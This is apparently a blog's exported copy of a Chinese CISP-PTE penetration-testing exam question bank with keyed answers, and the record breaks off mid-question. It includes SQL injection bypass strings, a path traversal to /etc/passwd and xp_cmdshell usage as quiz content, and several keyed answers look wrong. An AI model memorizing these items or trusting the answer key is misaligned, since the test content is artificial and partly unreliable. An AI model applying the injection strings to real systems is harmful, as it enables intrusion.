<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>选择题</title>
    <link href="/dong.github/2024/09/26/CISP-PTE/"/>
    <url>/dong.github/2024/09/26/CISP-PTE/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="选择题"><a href="#选择题" class="headerlink" title="选择题"></a>选择题</h1><hr><h2 id="旧题目"><a href="#旧题目" class="headerlink" title="旧题目"></a>旧题目</h2><h3 id="选择题-1"><a href="#选择题-1" class="headerlink" title="选择题 1"></a>选择题 1</h3><p>1·XXE漏洞可以做什么  <strong>C</strong></p><p>A.获取用户浏览器信息<br>B.网络钓鱼<br>C.读取服务器文件<br>D.盗取用户cookie</p><hr><p>2·以下哪些是WebLogic安装后的默认帐户名、口令使用的字符串 <strong>B</strong></p><p>A.admin<br>B.weblogic<br>C.login<br>D.system</p><hr><p>3·Apache的配置文件中，哪个字段定义了访问日志的路径 <strong>D</strong></p><p>A.HttpdLog<br>B.HttpLog<br>C.AccessLog<br>D.CustomLog</p><hr><p>4·没权限访问某个页面，服务器会返回哪个状态码 <strong>D</strong></p><p>A.401<br>B.500<br>C.200<br>D.403</p><hr><p>5·.htaccess文件的作用描述错误的是 <strong>C</strong></p><p>A.自定义404错误页面<br>B.配置默认文档<br>C.修改密码<br>D.可以禁止目录列表</p><hr><p>6·防御文件包含漏洞的方法不包括什么 <strong>D</strong></p><p>A.禁止文件名中包含字母和数字之外的字符<br>B.禁止自定义文件名<br>C.文件名中禁止出现目录名<br>D.禁止文件上传</p><hr><p>7·下面关于SSRF漏洞描述正确的是 <strong>A</strong></p><p>A.SSRF漏洞就是服务端请求伪造漏洞<br>B.SSRF漏洞只存在于PHP语言中<br>C.SSRF漏洞无法修复<br>D.SSRF漏洞是针对浏览器的漏洞</p><hr><p>8·apache默认解析的后缀中不包括 <strong>C</strong></p><p>A.phtml<br>B.php3<br>C.pht<br>D.php5</p><hr><p>9·哪个键唯一标识表组中的行 <strong>C</strong></p><p>A.本地键<br>B.超键<br>C.主键<br>D.外键</p><hr><p>10·之前版本的中间件未出现过解析漏洞的是 <strong>B</strong></p><p>A.iis<br>B.tomcat<br>C.ngnix<br>D.apache</p><hr><p>11·当交换机收到一个目的mac为68-A3-C4-29-82-F2的数据包，但此MAC地址不在交换机的MAC地址表中，交换机会怎么处理这个数据？<strong>D</strong></p><p>A.交换机将数据报发送给默认网关<br>B.交换机将会把数据包丢弃，因为它并没有这个MAC地址<br>C.交换机将发送一个ARP请求给它的全部接口（除去接收接口）<br>D.交换机把数据包从所有接口复制发送一遍（除去接收接口）</p><hr><p>12·以下哪种工具可以进行sql注入攻击？<strong>D</strong></p><p>A.msf<br>B.w3af<br>C.nmap<br>D.sqlmap</p><hr><p>13·当一个HTTPS 站点的证书存在问题时，浏览器就会出现警告信息已提醒浏览者注意，下列描述中哪一条不是导致出现提示的必然原因？<strong>A</strong></p><p>A.浏览器找不到对应的证书颁发机构<br>B.证书过期<br>C.证书的CN与实际站点不符<br>D.证书没有被浏览器信任</p><hr><p>14·攻击者通过XSS漏洞获取到QQ用户的cookie后，可以进行一下操作 <strong>D</strong></p><p>A.控制用户摄像头<br>B.劫持微信用户<br>C.偷取Q币<br>D.进入QQ空间</p><hr><p>15·MSSQL中可以用来执行系统命令的扩展是哪个 <strong>D</strong></p><p>A.xp_loginconfig<br>B.sp_addextendedproc<br>C.sp_dropextendedproc<br>D.xp_cmdshell</p><hr><p>16·如下措施不能有效防御XSS的是 <strong>B</strong></p><p>A.同源策略<br>B.编码<br>C.过滤<br>D.CSP（内容安全策略）</p><hr><p>17·Redis数据库的默认端口是哪个 <strong>D</strong></p><p>A.3306<br>B.1433<br>C.1521<br>D.6379</p><hr><p>18·黑客通过以下哪种攻击方式，可能大批量获取网站注册用户的身份信息 <strong>B</strong></p><p>A.越权<br>B.以上都可以<br>C.XSS<br>D.CSRF</p><p>19·在同一个bash 下依次执行下列命令。最后一次执行的whoami 的结果是什么？<strong>B</strong></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs autoit">root<span class="hljs-symbol">@kali</span>：~/Desktop<span class="hljs-meta"># whoami</span><br>root<br>root<span class="hljs-symbol">@kali</span>：~/Desktop<span class="hljs-meta"># function whoami() &#123; echo 1<span class="hljs-comment">;&#125;</span></span><br>root<span class="hljs-symbol">@kali</span>：~/Desktop<span class="hljs-meta"># whoami</span><br></code></pre></td></tr></table></figure><p>A.echo 1;<br>B.1<br>C.echo 1<br>D.root</p><blockquote><p>解释：第一次执行whoami 是正常显示 root.。function whoami() { echo 1;} 通过定义函数whoami ， 使得whoami 是一个函数，而初始化值为echo 1 ，而echo 1 的执行结果是1。也就是说，通过调用函数whoami 并且初始化(执行echo函数)，所以输出结果为1。</p></blockquote><hr><p>20·黑客控制一台Windows服务器。通过如下信息判断，以下哪些反弹shell操作会成功 <strong>B</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">C:\Users\test&gt;ping www<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span> -n <span class="hljs-number">1</span><br>正在 Pingwww<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.shifen</span><span class="hljs-selector-class">.com</span> <span class="hljs-selector-attr">[14.215.177.38]</span> 具有<span class="hljs-number">32</span>字节的数据：<br>请求超时<br>C:\Users\test&gt;telnet www<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span> <span class="hljs-number">80</span><br>正在链接www<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>...无法打开到主机的连接。<br>在端口 <span class="hljs-number">80</span>: 连接失败。<br></code></pre></td></tr></table></figure><p>A.icmp协议的后门<br>B.windows&#x2F;meterpreter&#x2F;reverse_tcp<br>C.windows&#x2F;meterpreter&#x2F;reverse_https<br>D.windows&#x2F;meterpreter&#x2F;reverse_http</p><blockquote><p>IE浏览器使用了代理，可能HTTP协议会受到防火墙限制。ping不通百度说明ICMP协议也受影响。故http、https、icmp协议的反弹shell都会失败</p></blockquote><h3 id="选择题-2"><a href="#选择题-2" class="headerlink" title="选择题 2"></a>选择题 2</h3><p>1·以下关于VPN说法正确的是 <strong>B</strong></p><p>A. VPN指的是用户自己租用线路，和公共网络物理上完全隔离的、安全的线路<br>B. VPN指的是用户通过公用网络建立的临时的、安全的连接<br>C. VPN不能做到信息认证和身份认证<br>D. 进入QQ空间VPN只能提供身份认证、不能提供加密数据的功能</p><hr><p>2·以下哪个工具不可以抓取HTTP数据包 <strong>D</strong></p><p>A. Burpsuite<br>B. Wireshark<br>C. Fiddler<br>D. Nmap</p><hr><p>3·以下哪个数据库不是关系型数据库 <strong>B</strong></p><p>A. mysql<br>B. redis<br>C. mssql<br>D. oracle</p><hr><p>4·以下命令可以用来获取DNS记录的是 <strong>C</strong></p><p>A.traceroute<br>B.ping<br>C.dig<br>D.who</p><hr><p>5·拿到一个windows下的webshell，我想看一下主机的名字，如下命令做不到的是 <strong>D</strong></p><p>A.hostname<br>B.systeminfo<br>C.ipconfig &#x2F;all<br>D.set</p><hr><p>6·如何防护存储型XSS漏洞 <strong>A</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">A</span>.  对<span class="hljs-selector-tag">html</span>标签进行转义处理  <br><span class="hljs-selector-tag">B</span>.  使用Ajax技术    <br>C.  使用安全的浏览器 <br>D.  使用Cookie存储身份信息<br></code></pre></td></tr></table></figure><hr><p>7·攻击者截获并记录了从A到B的数据，然后又从早些时候所截获的数据中提取出信息，重放发往B称为 <strong>D</strong></p><p>A.中间人攻击<br>B.口令猜测器和字典攻击<br>C.强力攻击<br>D.重放攻击</p><hr><p>8·XXE漏洞可以做什么 <strong>B</strong></p><p>A.盗取用户cookie<br>B.读取服务器文件<br>C.网络钓鱼<br>D.获取用户浏览器信息</p><hr><p>9·Mysql数据库若使用load_file()函数读取操作系统文件时需要的权限是 <strong>D</strong></p><p>A.File<br>B.LoadFile<br>C.Write<br>D.Read</p><hr><p>10·SQLSERVER数据库身份验证支持的模式错误是 <strong>C</strong></p><p>A.windows身份验证模式<br>B.SQL身份验证模式<br>C.radius身份验证模式<br>D.windows和SQL混合验证模式</p><hr><p>11·CSRF攻击不能做什么 <strong>C</strong></p><p>A.删除用户信息<br>B.修改用户权限<br>C.盗取用户凭证<br>D.取消订单</p><hr><p>12·语义攻击利用的是 <strong>A</strong></p><p>A.信息内容的含义<br>B.病毒对软件攻击<br>C.黑客对系统攻击<br>D.黑客和病毒的攻击</p><hr><p>13·TCP会话劫持出了SYN　Flood攻击，还需要 <strong>B</strong></p><p>A.  SYN扫描<br>B.  序列号预测<br>C.  扫描TCP<br>D.  扫描SYN&#x2F;ACK</p><hr><p>14·张三将微信个人头像换成微信群中某好友头像，并将昵称改为该好友的昵称，然后向该好友的其他好友发送一些欺骗消息。该攻击行为属于以下哪类攻击 <strong>D</strong></p><p>A.口令攻击<br>B.暴力破解<br>C.拒绝服务攻击<br>D.社会工程学攻击</p><hr><p>15·以下数据库只能通过字典枚举数据表的是 <strong>C</strong></p><p>A.mssql<br>B.oracle<br>C.mysql &lt; 5.0<br>D.mysql &gt; 5.0</p><hr><p>16·第一次出现”HACKER”这个词是在 <strong>B</strong></p><p>A.BELL实验室<br>B.麻省理工实验室<br>C.AT＆T实验室<br>D.以上都没有</p><hr><p>17·之前版本的中间件未出现过解析漏洞的是 <strong>C</strong></p><p>A.  apache<br>B.  iis<br>C.  tomcat<br>D.  ngnix</p><hr><p>18·Windows操作系统中可显示或修改任意访问控制列表的命令是 <strong>B</strong></p><p>A.ipconfig<br>B.cacls<br>C.tasklist<br>D.systeminfo</p><hr><p>19·在Google Hacking语法中，下面哪一个是搜索指定类型的文件 <strong>D</strong></p><p>A.intext<br>B.intitle<br>C.site<br>D.filetype</p><hr><p>20·以下关于cc攻击说法错误的是 <strong>B</strong></p><p>A.cc攻击需要借助代理进行<br>B.cc攻击利用的是tcp协议的缺陷<br>C.cc攻击难以获取目标机器的控制权<br>D.cc攻击最早在国外大面积流行</p><hr><h3 id="选择题-3"><a href="#选择题-3" class="headerlink" title="选择题 3"></a>选择题 3</h3><p>1·黑客通常实施攻击的步骤是什么？<strong>B</strong></p><p>A.远程攻击、本地攻击、物理攻击<br>B.踩点、扫描、获取访问权、提升权限、安装后门、清除痕迹<br>C.拒绝服务攻击、扫描、获取控制器、清除痕迹<br>D.扫描、拒绝服务攻击、获取控制权、安装后门、嗅探</p><hr><p>2·反向连接后门和普通后门的区别是 <strong>D</strong></p><p>A.根本没有区别<br>B.只能由控制端主动连接，所以防止外部连入即可<br>C.这种后门无法清除<br>D.主动连接控制端、防火墙配置不严格时可以穿透防火墙</p><hr><p>3·数字签名功能不包括 <strong>C</strong></p><p>A.发送方身份确认<br>B.保证数据的完整性<br>C.接收方身份确认<br>D.防止发送方的抵赖行为</p><hr><p>4·网络攻击的发展趋势是 <strong>C</strong></p><p>A.黑客攻击<br>B.病毒攻击<br>C.攻击工具日益先进<br>D.黑客技术与网络病毒日益融合</p><hr><p>5·SQL杀手蠕虫病毒发作的特征是什么 <strong>B</strong></p><p>A.攻击个人PC终端<br>B.大量消耗网络带宽<br>C.攻击手机网络<br>D.破坏PC游戏程序</p><hr><p>6·在进行网络安全需求分析时，应摒弃 <strong>D</strong></p><p>A.集成意识<br>B.权衡意识<br>C.风险意识<br>D.绝对意识</p><hr><p>7·下列网络安全技术中，能够对内部攻击、外部攻击和误操作进行实时保护的是 <strong>B</strong></p><p>A.杀毒软件<br>B.入侵检测<br>C.防火墙<br>D.端口扫描</p><hr><p>8·依据OSI安全体系结构，数据链路层能提供 <strong>A</strong></p><p>A.数据完整性服务<br>B.鉴别服务<br>C.抗抵赖性服务<br>D.连接机密性服务</p><hr><p>9·在以下的认证方式中，最不安全的是 <strong>A</strong></p><p>A.PAP<br>B.CHAP<br>C.MS-CHAP<br>D.SPAP</p><hr><p>10·下列那个选项不是上传功能常用安全监测机制 <strong>A</strong></p><p>A.URL中是否包含一些特殊标签&lt;、&gt;、script、alert<br>B.客户端检查机制JavaScript验证<br>C.服务的MIME检查验证<br>D.服务端文件扩展名检查验证机制</p><hr><p>11·防止重发攻击最有效的方法是 <strong>D</strong></p><p>A.对用户账号和密码进行加密<br>B.经常修改用户账号名称和密码<br>C.使用复杂的账号名称和密码<br>D.使用”一次一密”加密方式</p><hr><p>13·TCP SYN 泛洪攻击的原理是利用了 <strong>A</strong></p><p>A.TCP三次握手过程<br>B.TCP数据传输中的窗口技术<br>C.TCP连接终止时的FIN报文<br>D.TCP面向流的工作机制</p><hr><p>14·ARP欺骗的实质是 <strong>D</strong></p><p>A.扰乱网络的正常运行<br>B.让其他计算机知道自己的存在<br>C.窃取用户在网络中传输的数据<br>D.提供虚拟的MAC与IP地址的组合</p><hr><p>15·数字证书不包含 <strong>D</strong></p><p>A.证书的有效期<br>B.CA签发证书时所使用的签名算法<br>C.颁发机构的名称<br>D.证书持有者的私有密钥信息</p><hr><p>16·信息安全“老三样” 是 <strong>A</strong></p><p>A.防火墙、入侵检测、杀毒<br>B.防火墙、扫描、杀毒<br>C.入侵检测、扫描、杀毒<br>D.防火墙、入侵检测、扫描</p><hr><p>17·下列哪个攻击不在网络层 <strong>C</strong></p><p>A.Teardrop<br>B.IP欺诈<br>C.SQL注入<br>D.Smurf</p><hr><p>18·防火墙通常采用哪两种核心技术 <strong>A</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">A</span>.包过滤和应用代理<br><span class="hljs-selector-tag">B</span>.协议分析和应用代理<br>C.协议分析和协议代理<br>D.包过滤和协议分析<br></code></pre></td></tr></table></figure><hr><p>19·认为DES算法已经过时的原因是 <strong>D</strong></p><p>A.加密速度太慢<br>B.密钥发布方法不在适应开放式网络的要求<br>C.加密算法的思想已经过时<br>D.密钥长度太短，利用高性能计算机可以在短时间内破解</p><hr><p>20·如果采用穷举法进行暴力破解56bit的密钥，假设穷举速度为每秒10^6次，大约所需的时间为 <strong>C</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">A</span>.  <span class="hljs-number">35</span> min<br><span class="hljs-attribute">B</span>.  <span class="hljs-number">5</span>.<span class="hljs-number">4</span>x10^<span class="hljs-number">24</span> years<br><span class="hljs-attribute">C</span>.  <span class="hljs-number">1140</span> years<br><span class="hljs-attribute">D</span>.  <span class="hljs-number">6</span>.<span class="hljs-number">4</span>x10^<span class="hljs-number">12</span> years<br></code></pre></td></tr></table></figure><hr><blockquote><p>假设我们秘钥就只有两位，那么我们需要猜几次。</p><p>00</p><p>01</p><p>10</p><p>11</p><p>由于有两位那么这个秘钥的可能就有四种可能。</p><p>分别是 00,01，10,11 这四种可能。那么我们可能一次就猜中了，这个是最好的情况，或者第一次没有猜中，第二次猜中；或者前两次都没有猜中，第三次猜中，或者是前三次都没有猜中，那么我们也知道秘钥是什么，就是剩余的那个。也就是最坏的情况下我们需要猜测3次，最坏的情况我们需要尝试3次，注意注意是三次。不是四次。</p><p>我们需要猜测的次数：</p><p>1</p><p>2</p><p>3</p><p>那么平均数就是 （1+2+3）&#x2F;3</p><p>后面的个数表示有3个数，所以说如果秘钥的长度2那么我们平均猜测的次数就是6&#x2F;3&#x3D;2 就是两次就可以</p><p>依次类推，如果密钥长度为3，平均猜测需要4次。</p><p>假设密钥有56位，最好的情况一次猜中，最差的情况，第2的56次才猜中，那么平均值就是(1+2^56-1)&#x2F;2&#x3D;2^56&#x2F;2次。</p><p>2^56&#x3D;7.2*10^16</p><p>3.6<em>10^16&#x2F;10^6</em>3600<em>24</em>365约等于1141.55，答案应该选C。</p><p>参考链接：</p><p><a href="https://blog.csdn.net/mleader1/article/details/6777316">https://blog.csdn.net/mleader1/article/details/6777316</a></p><p><a href="https://max.book118.com/html/2018/1220/7014105103001165.shtm">https://max.book118.com/html/2018/1220/7014105103001165.shtm</a></p><p><a href="https://blog.csdn.net/chichoxian/article/details/53035712">https://blog.csdn.net/chichoxian/article/details/53035712</a></p><p>另：10^6次方也不过1MHZ，这个主频应该是很低了的，现在CPU都在GHZ也就是１０^9次方以上，按照一个2.4GHz主频来计算，大概需要173.6天。</p></blockquote><hr><h3 id="选择题-4"><a href="#选择题-4" class="headerlink" title="选择题 4"></a>选择题 4</h3><p>1·2014年2月，我国成立了<strong>B</strong>，习近平总书记担任领导小组组长。</p><p>A. 中央网络技术和信息化领导小组<br>B. 中央网络安全和信息化领导小组<br>C. 中央网络安全和信息技术领导小组<br>D. 中央网络信息和安全领导小组</p><hr><p>2·2016年11月7日,十二届全国人大常会第二十四次会议以154票赞成,1票弃权,表决通过了《网络安全法》。该法律由全国人民代表大会常务员会于2016年11月7日发布,自<strong>C</strong>起施行。</p><p>A.2018年1月1日<br>B.2016年6月1日<br>C.2017年6月1日<br>D.2019年1月1日</p><hr><p>3·《网络安全法》明确了国家落实网络安全工作的职能部门和职责，其中明确规定由<strong>C</strong>负责统筹协调网络安全工作和相关监督管理工作。</p><p>A.中央网络安全与信息化小组<br>B.国务院<br>C.国家网信部门<br>D.国家公安部门</p><hr><p>4·网络安全技术可以分为主动防御技术和被动防御技术两大类，以下属于主动防御技术的是 <strong>A</strong></p><p>A.蜜罐技术<br>B.入侵检测技术<br>C.防火墙技术<br>D.恶意代码扫描技术</p><hr><p>5·Linux系统的运行日志存储的目录是 <strong>A</strong></p><p>A.&#x2F;var&#x2F;log<br>B.&#x2F;usr&#x2F;log<br>C.&#x2F;etc&#x2F;log<br>D.&#x2F;tmp&#x2F;log</p><hr><p>6·攻击者通过对目标主机进行端口扫可以直接获得 <strong>B</strong></p><p>A.目标主机的操作系统信息<br>B.目标主机开放端口服务信息<br>C.目标主机的登录口令<br>D.目标主机的硬件设备信息</p><hr><p>7·以下关于网络钓鱼的说法中,不正确的是 <strong>B</strong></p><p>A.网络钓鱼属于社会工程攻击<br>B.网络钓鱼与Web服务没有关系<br>C.典型的网络钓鱼攻击是将被攻击者引诱到一个钓鱼网站<br>D.网络钓鱼融合了伪装、欺骗等多种攻击方式</p><hr><p>8·APT攻击是一种以商业或者政治目的为前提的特定攻击，其中攻击者采用口令窃听、漏洞攻击等方式尝试进一步入侵组织内部的个人电脑和服务器，不断提升自己的权限，直至获得核心电脑和服务器控制权的过程被称为 <strong>C</strong></p><p>A.情报收集<br>B.防线突破<br>C.横向渗透<br>D.通道建立</p><hr><p>9·注入语句：http：&#x2F;&#x2F;xxx.xxx.xxx&#x2F;abc.asp?p&#x3D;YY and user&gt;0不仅可以判断服务器的后台数据库是否为SQL-SERVER，还可以得到 <strong>B</strong></p><p>A.当前连接数据库的用户数据<br>B.当前连接数据库的用户名<br>C.当前连接数据库的用户口令<br>D.当前连接的数据库名</p><hr><p>10·关于IIS的安全配置，哪些是不正确的 <strong>C</strong></p><p>A.将网站内容移动到非系统驱动程序<br>B.重命名IUSR账户<br>C.禁用所有WEB服务扩展<br>D.创建应用程序池</p><hr><p>11·SQL语句中，彻底删除一个表的命令是 <strong>B</strong></p><p>A.delete<br>B.drop<br>C.clear<br>D.remore</p><hr><p>12·SQL  Server默认的具有DBA权限的账号是什么 <strong>C</strong></p><p>A.root<br>B.admin<br>C.sa<br>D.system</p><hr><p>13·下列哪些属于WEB脚本程序编写不当造成的 <strong>C</strong></p><p>A.IIS5.0  Webdav Ntdll.dll远程缓冲区一处漏洞<br>B.apache可以通过..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd方位系统文件<br>C.登陆页面可以用password&#x3D;’a’or’a’&#x3D;’a’绕过<br>D.数据库中的口令信息明文存放</p><hr><p>14·下列选项中不是APT攻击的特点 <strong>C</strong></p><p>A.持续性强<br>B.手段多样<br>C.攻击少见<br>D.目标明确</p><hr><p>15·在编写目录扫描的工具时，那个可以增加扫描速度 <strong>B</strong></p><p>A.GET<br>B.HEAD<br>C.POST<br>D.PUT</p><hr><p>16·以下最有效的防范上传漏洞 <strong>D</strong></p><p>A.用黑名单的方式验证文件后缀，上传后保持文件名不变<br>B.验证文件头确定是图片格式，上传后文件名不变<br>C.验证上传文件的内容，匹配关键字来确定是否允许上传，上传后保持文件名不变<br>D.不做任何验证，上传文件名自动系统修正以字符串加图片后缀形式</p><hr><p>17·如果一个网站存在CSRF可以通过CSRF漏洞做那些事情 <strong>D</strong></p><p>A.获取网站用户注册的个人资料信息<br>B.修改网站用户的个人资料信息<br>C.冒充网站用户的身份发布信息<br>D.以上都可以</p><hr><p>18·以下说法正确的是 <strong>B</strong></p><p>A.SSRF是跨站请求伪造攻击由客户端发起<br>B.SSRF是服务器端请求伪造由服务器发起<br>C.CSRF是服务器端请求伪造由服务器发起<br>D.重放攻击是将截获的数据包进行重放，达到身份认证的目的</p><hr><p>19·DOMXSS和平常的XSS下列说法正确的是 <strong>B</strong></p><p>A.DOMxss是服务端代码造成的平常xss不是<br>B.DOMxss不是服务端代码造成的而平常XSS是<br>C.两者都是服务端代码造成的<br>D.两者都不是服务端代码造成的</p><hr><p>20·在测试SQL注入时，那种方式不可取 <strong>A</strong></p><p>A.?id&#x3D;1+1<br>B.?id&#x3D;2-1<br>C.?id&#x3D;1 and 1&#x3D;1<br>D.?id&#x3D;1 or 1&#x3D;1</p><hr><h3 id="选择题-5"><a href="#选择题-5" class="headerlink" title="选择题 5"></a>选择题 5</h3><p>1·那个是administrator的Sid <strong>B</strong></p><p>A.s–100<br>B.s–500<br>C.s–1000<br>D.s–10001</p><hr><p>2·下列那个命令可以打印Linux下的所有进程信息 <strong>D</strong></p><p>A.ls-d<br>B.ls-l<br>C.su<br>D.ps-ef</p><hr><p>3·在linux下为某个文件添加权限命令chmod 741 中的4是什么意思 <strong>B</strong></p><p>A.执行权限<br>B.只读权限<br>C.只写权限<br>D.所有权限</p><hr><p>4·一个网站存在命令执行漏洞由于服务器不能上网,我们用什么方式将文件传上去 <strong>D</strong></p><p>A.FTP<br>B.powershell<br>C.vbs<br>D.echo </p><hr><p>5·Linux下那个命令可以查看文件日志的最后100行数据 <strong>D</strong></p><p>A.mv -100 log<br>B.grep -100 log<br>C.cat -100 log<br>D.tail -100 log</p><hr><p>6·要向现有的表中添加列用那个命令 <strong>A</strong></p><p>A.alert<br>B.change<br>C.insert<br>D.update</p><hr><p>7·oracle中默认用户权限最高的是那个 <strong>A</strong></p><p>A.sys<br>B.system<br>C.sysman<br>D.internal</p><hr><p>8·weblogic有几个默认账户与密码形同的账号不包括那个 <strong>A</strong></p><p>A.admin<br>B.weblogic<br>C.guest<br>D.system</p><hr><p>9·HTTP 302状态消息表示 <strong>C</strong></p><p>A.对被请求页面的访问被禁止<br>B.所请求的页面可在别的url下被找到<br>C.所请求的页面已经临时转移至新的url<br>D.所请求的页面已经转移至新的url  （301）</p><hr><p>10·以下哪些是WebLogic安装后的默认帐户名、口令使用的字符串 <strong>C</strong></p><p>A.admin<br>B.login<br>C.weblogic<br>D.system</p><hr><p>11·以下查看linux系统内核版本是 <strong>A</strong></p><p>A.uname –a<br>B.cat &#x2F;etc&#x2F;passwd<br>C.cat &#x2F;release -a<br>D.cat &#x2F;porc&#x2F;version</p><hr><p>12·如下哪个响应报头可以让我们跳转到新的位置 <strong>D</strong></p><p>A.Server<br>B.WWW-Authenticate<br>C.Host<br>D.Location</p><hr><p>13·没权限访问某个页面，服务器会返回哪个状态码 <strong>C</strong></p><p>A.500<br>B.200<br>C.403<br>D.401</p><hr><p>14·在web页面中增加验证码功能后，下面说法正确的是 <strong>C</strong></p><p>A. 可以防止任意URL跳转<br>B. 可以防止文件上传漏洞<br>C. 可以防止数据重复提交正确答案<br>D. 可以防止文件包含漏洞</p><hr><p>15·SQL Sever中可以使用哪个存储过程调用操作系统命令，添加系统账号 <strong>C</strong></p><p>A.xp_dirtree<br>B.xp_xshell<br>C.xp_cmdshell<br>D.xp_deletekey</p><hr><p>16·Oracle默认情况下，口令的传输方式是 <strong>B</strong></p><p>A.DES加密传输<br>B.明文传输<br>C.3DES加密传输<br>D.MD5加密传输</p><hr><p>17·不属于数据库加密方式的是 <strong>C</strong></p><p>A.硬件&#x2F;软件加密<br>B.库内加密<br>C.专用中间件加密<br>D.库外加密</p><hr><p>18·IPSecVPN安全技术没有用到 <strong>D</strong></p><p>A.端口映射技术<br>B.隧道技术<br>C.加密技术<br>D.入侵检测技术</p><hr><p>19·小斌正在对小明的网站进行渗透测试，经过一段时间的探测后，小斌发现小明的网站存在一个sql注入漏洞： <a href="http://i.xiaoming.com/user/says.php?uid=1845%20skey=2014">http://i.xiaoming.com/user/says.php?uid=1845%20skey=2014</a> 该地址是用于搜索用户曾经的发言的页面,会返回一些留言信息，小斌简单测试后发现<a href="http://i.xiaoming.com/user/says.php?uid=1845%20skey=2014%27%20or%202-1%20--%20">http://i.xiaoming.com/user/says.php?uid=1845%20skey=2014&#39;%20or%202-1%20--%20</a> 返回错误信息<a href="http://i.xiaoming.com/user/says.php%EF%BC%9Fuid=1845%20skey=2014'%20)%20or%201-1%20--%20%E5%8D%B4%E8%BF%94%E5%9B%9E%E7%A9%BA%E7%99%BD%E4%BF%A1%E6%81%AF%E5%88%99%E5%B0%8F%E6%98%8E%E7%BD%91%E7%AB%99%E8%AF%A5%E5%A4%84%E9%80%BB%E8%BE%91%E5%8F%AF%E8%83%BD%E7%9A%84sql%E8%AF%AD%E5%8F%A5%E6%98%AF">http://i.xiaoming.com/user/says.php？uid=1845%20skey=2014&#39;%20)%20or%201-1%20--%20却返回空白信息则小明网站该处逻辑可能的sql语句是</a> <strong>C</strong></p><p>A.select * from user_says where deleted&#x3D;0 and uid&#x3D;$uid and skey like “%$skey%”<br>B.select * from user_says where deleted&#x3D;0 and (uid&#x3D;$uid and skey like ‘%$skey%’)<br>C.select * from user_says where deleted&#x3D;0 and (uid&#x3D;$uid and skey&#x3D;’$key’)<br>D.select * from user_says where deleted&#x3D;0 and uid&#x3D;$uid and skey&#x3D;’$key’</p><hr><p>20·向有限的空间输入超长的字符串是哪一种攻击手段 <strong>A</strong></p><p>A.缓冲区溢出<br>B.IP欺骗<br>C.拒绝服务<br>D.网络监听</p><hr><h3 id="选择题-6"><a href="#选择题-6" class="headerlink" title="选择题 6"></a>选择题 6</h3><p>1·主要用于加密机制的协议是 <strong>A</strong></p><p>A.SSL<br>B.TELNET<br>C.HTTP<br>D.FTP</p><hr><p>2·什么是数据库安全的第一道保障 <strong>A</strong></p><p>A.操作系统的安全<br>B.数据库管理系统层次<br>C.网络系统的安全<br>D.数据库管理员</p><hr><p>3·常见的数据库操作中，下面哪一个是创建表 <strong>C</strong></p><p>A.CREATE DATABASE<br>B.DROP TABLE<br>C.CREATE TABLE<br>D.ALTER TABLE</p><hr><p>4·base64（）函数在mysql中可以使用的最低版本什么 <strong>C</strong></p><p>A.5.4版本<br>B.5.5版本<br>C.5.6版本<br>D.5.7版本</p><blockquote><p>MySQL在5.6版本的时候增加了to_base64和from_base64函数，在此之前没有内部函数，只能使用User-Defined-Function</p></blockquote><hr><p>5·mysql中不用的注释符有 <strong>D</strong></p><p>A.#<br>B.&#x2F;**&#x2F;<br>C.–+<br>D.<!--...--></p><hr><p>6·HTTP请求头中，可以修改请求IP的是哪个 <strong>A</strong></p><p>A.X-Forwarded-For<br>B.Referer<br>C.Host<br>D.Content-type</p><hr><p>7·以下算法中属于非对称算法的是 <strong>B</strong></p><p>A.DES<br>B.RSA算法<br>C.IDEA<br>D.三重DES</p><hr><p>8·信息安全中PDR模型的关键因素是 <strong>D</strong></p><p>A.模型<br>B.客体<br>C.技术<br>D.人</p><hr><p>9·数据完整性指的是 <strong>A</strong></p><p>A.防止非法实体对用户的主动攻击，保证数据接收方收到的信息与发送方发送的信息完全一致<br>B.保护网络中个系统之间交换的数据，防止因数据被截获而造成泄密<br>C.确保数据是由合法实体发出的<br>D.提供连接实体身份的鉴别</p><hr><p>10·常规端口扫描和半开放式扫描的区别是 <strong>D</strong></p><p>A.半开式采用UDP方式扫描<br>B.没区别<br>C.扫描准确性不一样<br>D.没有完成三次握手，缺少ACK过程</p><hr><p>11·许多黑客攻击都是利用软件实现中的缓冲区溢出的漏洞，对此最可靠的解决方案是什么 <strong>C</strong></p><p>A.安装防病毒软件<br>B.安装防火墙<br>C.给系统安装最新的补丁<br>D.安装入侵检测系统</p><hr><p>12·下列哪类工具是日常用来扫描web漏洞的工具  <strong>B</strong></p><p>A.NMAP<br>B.IBM APPSCAN<br>C.X-SCAN<br>D.Nessus</p><hr><p>13·Weblogic的默认web端⼝是什么 <strong>A</strong></p><p>A.7001<br>B.7002<br>C.7000<br>D.7080</p><hr><p>14·iis曾经出现过的漏洞不包括哪个 <strong>D</strong></p><p>A.解析漏洞<br>B.IIS溢出漏洞<br>C.PUT漏洞<br>D.反序列化漏洞</p><hr><p>15·iis不可以解析哪个后缀 